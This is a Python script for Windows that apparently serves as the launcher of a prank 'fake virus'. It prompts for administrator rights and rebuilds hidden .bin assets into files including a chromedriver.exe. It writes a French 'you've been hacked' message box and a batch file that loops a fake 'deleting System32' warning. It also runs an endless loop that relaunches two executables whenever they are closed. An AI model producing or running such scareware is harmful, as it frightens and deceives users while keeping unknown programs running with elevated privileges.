from sys import executable, argv
from ctypes import windll
from psutil import process_iter
from time import sleep
from os import system, startfile


if windll.shell32.IsUserAnAdmin():
    
    def WriteNewFiles(img_number: int):
        with open("assets/core_files/core_file_01.bin", "rb") as f:
            with open("assets/music.wav", "wb+") as f2: f2.write(f.read())   
        with open("assets/core_files/core_file_00.bin", "rb") as f:
            with open("assets/clip.mp4", "wb+") as f2: f2.write(f.read())
        with open("assets/core_files/core_file_02.bin", "rb") as f:
            with open("assets/chromedriver.exe", "wb+") as f2: f2.write(f.read())
        with open("assets/message.vbs", "w+", encoding="utf8") as f: f.write("x=msgBox(\"Graven vous a hacker.\", 0+48+4096,\"Felicitations !\")")
        for i in range(img_number):
            with open(f"assets/.i/{i}.bin", "rb") as f:
                with open(f"assets/img.{i}.png", "wb+") as f2: f2.write(f.read())
        with open("assets/sys.bat", "w+", encoding="utf") as f: f.write("@ECHO OFF\ntitle GRAVEN T'AS BAISE\ncolor 4a\ncls\necho Graven t'as hack lol.\ntimeout 3 /nobreak >nul\n:c\necho SUPRESSION DU SYSTEM 32...\ngoto c")

    WriteNewFiles(19)
    
    while True:
        
        if "core_task.exe" not in (p.name() for p in process_iter()):
            startfile("core_task.exe")
            sleep(1.5)
        elif "grv.exe" not in (p.name() for p in process_iter()):
            system("start /MIN grv.exe")
            sleep(1.5)


else: windll.shell32.ShellExecuteW(None, "runas", executable, " ".join(argv[0:]), None, 1)